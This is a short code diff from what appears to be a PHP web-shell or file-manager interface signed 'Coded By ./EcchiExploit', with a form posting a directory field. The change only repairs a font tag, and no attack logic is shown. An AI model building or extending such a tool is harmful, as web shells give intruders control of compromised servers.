@@ -55,7 +55,7 @@ else{
 <img src="https://i.ibb.co/WH4DrnR/IMG-20190901-WA0263.jpg" alt="IMG-20190901-WA0263" border="0" height="100px" width="200px">
 	<body>
 			<center>
-				<font face="Orbitron"<font size="7">Coded By ./EcchiExploit</font>
+				<font size="7">Coded By ./EcchiExploit</font>
 						<table>
 							<tr><td><form method="post" action="?action"></td></tr>
 							<tr><td><input type="text" name="dir" value="'.$direc.'"></td> </tr>
